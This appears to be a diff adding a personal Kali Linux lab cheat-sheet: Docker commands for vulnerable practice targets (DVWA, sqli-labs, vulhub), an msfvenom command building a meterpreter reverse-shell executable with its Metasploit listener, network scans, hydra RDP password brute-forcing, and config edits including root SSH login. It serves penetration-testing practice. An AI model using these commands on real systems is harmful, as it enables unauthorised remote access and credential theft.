@@ -1,0 +1,64 @@
+apt install ... (ssh, docker.io, docker-compose)
+
+
+docker images (apline, sagikazarmark/dvwa 20000, acgpiano/sqli-labs 20001)
+docker ps -a
+docker info
+docker pull ...
+docker run -dit(run in background) --name=... -p(port) x:80(change default port 80 to x) ...
+docker start ...
+docker restart ...
+docker stop ...
+docker rm -f(forced deletion) ...
+docker exec -it(go into which container) ... bash(similar to cmd)
+
+git clone https://gitclone.com/github.com/vulhub/vulhub
+docker-compose up -d(Enter vulhub/.../... & run this code)
+docker-compose down
+
+msfvenom -p(payload) windows/x64/meterpreter/reverse_tcp lhost=192.168.47.130 lport=9999 -f(file's format) exe -o(output) test.exe
+base64 [-d] file
+python3 -m http.server 10000(port)
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.47.130
+set lport 9999
+run
+
+netdiscover -h
+netdiscover -r 192.168.47.0/24
+nmap 192.168.47.129 -O
+hydra -L <username_list> -P <password_list> <target_ip> <protocol>
+hydra -l <username> -p <password> <target_ip> <protocol>
+hydra -l zwxfl -P pw.txt 192.168.47.129 rdp -V -I -F -t 4
+wordlists
+cat rockyou.txt | grep zwx [| wc -l]
+
+/etc/ssh/sshd_config:
+--------------new-----------------
+PermitRootLogin yes
+
+
+/etc/apt/sources.list:
+---------------------------------original-----------------------------------------------
+# See https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/
+deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
+
+# Additional line for source packages
+# deb-src http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
+-----------------------------------new------------------------------------------------
+deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+
+
+/etc/docker/daemon.json & (systemctl daemon-reload):
+-----------------------new-------------------
+{
+    "registry-mirrors": [
+        "https://docker.1panel.live",
+        "https://docker.m.daocloud.io",
+        "https://hub.rat.dev"
+    ]
+}
